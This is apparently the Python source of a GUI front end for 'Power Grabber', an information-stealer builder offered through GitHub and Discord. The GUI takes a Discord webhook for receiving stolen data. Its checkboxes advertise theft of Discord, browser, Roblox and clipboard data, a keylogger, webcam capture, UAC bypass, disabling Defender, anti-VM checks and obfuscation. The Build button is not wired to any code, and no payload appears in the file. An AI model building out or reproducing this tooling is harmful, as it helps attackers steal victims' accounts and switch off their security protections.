import customtkinter as ctk
import os
from customtkinter import *
from tkinter import *
import requests
from io import BytesIO
from PIL import Image, ImageTk
class Power_Grabber(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title('Power Grabber Builder')
        self.geometry('1000x600')
        self.resizable(False, False)
        ctk.set_appearance_mode('dark')
        ctk.set_default_color_theme("dark-blue")
        ctk.set_widget_scaling(1.0)
        self.main_frame = ctk.CTkFrame(self, fg_color='#1A1A1A', corner_radius=0)
        self.main_frame.pack(side=LEFT, fill=BOTH, expand=True)
        self.sidebar = ctk.CTkFrame(self, width=300, fg_color='#212127', corner_radius=0)
        self.sidebar.pack(side=RIGHT, fill=Y)
        url = "https://github.com/Powercascade/Power-grabber/blob/main/Power%20Grabber.png?raw=true"
        response = requests.get(url)
        image_data = response.content
        image = Image.open(BytesIO(image_data))
        self.logo = ImageTk.PhotoImage(image)
        self.logo_label = ctk.CTkLabel(self.sidebar, image=self.logo, text="")
        self.logo_label.pack(pady=(20, 10))
        self.sidebar_title = ctk.CTkLabel(self.sidebar, text="Power Grabber", font=('Arial', 30, 'bold'))
        self.sidebar_title.pack(pady=10)
        self.options_button = ctk.CTkButton(self.sidebar, text="Options", command=self.show_options_page,
                                            fg_color='#FF6B6B', hover_color='#FF3535',
                                            font=('Arial', 16))
        self.options_button.pack(pady=10)
        self.credits_button = ctk.CTkButton(self.sidebar, text="Credits", command=self.show_credits_page,
                                            fg_color='#FF6B6B', hover_color='#FF3535',
                                            font=('Arial', 16))
        self.credits_button.pack(pady=10)
        self.content_frame = ctk.CTkFrame(self.main_frame, fg_color='transparent')
        self.content_frame.pack(padx=20, pady=20, fill=BOTH, expand=True)
        self.options_page = self.create_options_page()
        self.credits_page = self.create_credits_page()
        self.github_button = ctk.CTkButton(self.sidebar, text="GitHub Repo", command=self.open_github,
                                           fg_color='#FF6B6B', hover_color='#FF3535',
                                           font=('Arial', 16))
        self.github_button.pack(pady=10)
        self.discord_button = ctk.CTkButton(self.sidebar, text="Join Discord", command=self.join_discord,
                                            fg_color='#FF6B6B', hover_color='#FF3535',
                                            font=('Arial', 16))
        self.discord_button.pack(pady=10)
        self.support_button = ctk.CTkButton(self.sidebar, text="Contact Support", command=self.contact_support,
                                    fg_color='#FF6B6B', hover_color='#FF3535',
                                    font=('Arial', 16))
        self.support_button.pack(pady=10)
        self.free_vbucks_button = ctk.CTkButton(self.sidebar, text="FrEe VbUcKs!11!1",
                                                command=self.open_free_vbucks_link, fg_color='#FF6B6B',
                                                hover_color='#FF3535', font=('Arial', 16))
        self.free_vbucks_button.pack(pady=10)
    def create_options_page(self):
        page = ctk.CTkFrame(self.content_frame, fg_color='transparent')
        webhook_entry = ctk.CTkEntry(page, width=320, height=45, 
                                     fg_color='#333333', text_color='white',
                                     placeholder_text='Enter Webhook URL:', 
                                     placeholder_text_color='lightgray',
                                     border_width=3, corner_radius=15, 
                                     border_color='#FF6B6B', 
                                     font=('Arial', 14, 'bold'))
        webhook_entry.pack(pady=(15, 15))

        filename_entry = ctk.CTkEntry(page, width=320, height=45, 
                                      fg_color='#333333', text_color='white',
                                      placeholder_text='File name (don\'t type extension)', 
                                      placeholder_text_color='lightgray',
                                      border_width=3, corner_radius=15, 
                                      border_color='#FF6B6B', 
                                      font=('Arial', 14, 'bold'))
        filename_entry.pack(pady=(15, 25))
        options_label = ctk.CTkLabel(page, text='Options:', 
                                     font=('Arial', 24, 'bold'))
        options_label.pack(pady=(0, 10))
        checkbox_options = [
            'Discord Info', 'Browser Info', 'System info', 'Games info', 'Webcam', 
            'Screenshot', 'Self destruction', 'Obfuscate', 'Anti VM', 'Disable defender', 
            'Exact location', 'Vulnerable port creation', 'UAC Bypass', 
            'Send to your computer', 'Roblox account', 'Clipboard contents', 'Discord Injection',
            'Ping', 'Kill defender (Different than disable)', 'Self exclusion', 'Keylogger'
        ]
        checkbox_frame = ctk.CTkFrame(page, fg_color='transparent')
        checkbox_frame.pack(fill=X)
        for i, option in enumerate(checkbox_options):
            row = i // 3
            col = i % 3
            ctk.CTkCheckBox(checkbox_frame, text=option, width=200, height=32,
                            fg_color='#FF6B6B', text_color='white', 
                            border_color='#FF3535', corner_radius=12).grid(row=row, column=col, padx=10, pady=5, sticky='w')
        pumper_frame = ctk.CTkFrame(page, fg_color='transparent')
        pumper_frame.pack(fill=X, pady=(20, 0))

        pumper_label = ctk.CTkLabel(pumper_frame, text='File Pumper (MB):', 
                                    font=('Arial', 16))
        pumper_label.pack(side=LEFT, padx=(0, 10))

        pumper_combo = ctk.CTkComboBox(pumper_frame, values=['None', '5', '10'], width=100, height=32, 
                                       fg_color='#FF3535', text_color='white', border_color='#FF3535', 
                                       corner_radius=12, state="readonly")
        pumper_combo.pack(side=LEFT)
        ping_label = ctk.CTkLabel(pumper_frame, text='Ping:  ', font=('Arial', 16))
        ping_label.pack(side=LEFT, padx=(10, 0))
        ping_combo = ctk.CTkComboBox(pumper_frame, values=['None', 'Here', 'Everyone'], width=100, height=32, 
                                     fg_color='#FF3535', text_color='white', border_color='#FF3535', 
                                     corner_radius=12, state="readonly")
        ping_combo.pack(side=LEFT)

        spacer = ctk.CTkFrame(pumper_frame, width=20, fg_color='transparent')
        spacer.pack(side=LEFT, fill=X, expand=True)

        build_button = ctk.CTkButton(pumper_frame, text="Build", width=200, height=40,
                                     fg_color='#FF6B6B', hover_color='#FF3535',
                                     font=('Arial', 18, 'bold'))
        build_button.pack(side=RIGHT, padx=(0, 10))
        

        return page
        
    def create_credits_page(self):
        page = ctk.CTkFrame(self.content_frame, fg_color='transparent')
        credits_label = ctk.CTkLabel(page, text="Credits", font=('Arial', 24, 'bold'))
        credits_label.pack(pady=(0, 20))
        credits_text = """
        Thanks to the following people for their contributions:

        - Creator/Owner:
        - Powercascade

        - Developers:
        - Taktikal.exe
          Taktikal.exe provided crucial code for this project
        - Powercascade
          Powercascade started the project and made most of the code

        - Helpers:
        - TheOneWhoWatches
          Watches paid Powercascade $20 to make this project and gave him the idea to make premium
        - Special thanks:
        Special thanks to you the user for using Power Grabber. 
        If you have any issues please contact Powercascade on Discord.

        - Existing
        - LLucas1425
        """
        credits_textbox = ctk.CTkTextbox(page, width=500, height=300, fg_color='#212127', text_color='white')
        credits_textbox.pack(pady=10)
        credits_textbox.insert("1.0", credits_text)
        credits_textbox.configure(state="disabled")
        return page
    def show_options_page(self):
        self.credits_page.pack_forget()
        self.options_page.pack(fill=BOTH, expand=True)
    def show_credits_page(self):
        self.options_page.pack_forget()
        self.credits_page.pack(fill=BOTH, expand=True)
    def open_github(self):
        os.system("start https://github.com/Powercascade/Power-grabber")
    def join_discord(self):
        os.system("start https://discord.gg/FzvXRxNzM2")
    def contact_support(self):
        os.system("start https://discord.gg/QmtjEGDzBf")
    def open_free_vbucks_link(self):
        os.system("start https://www.youtube.com/watch?v=dQw4w9WgXcQ")
        self.show_options_page()

if __name__ == '__main__':
    app = Power_Grabber()
    app.mainloop()

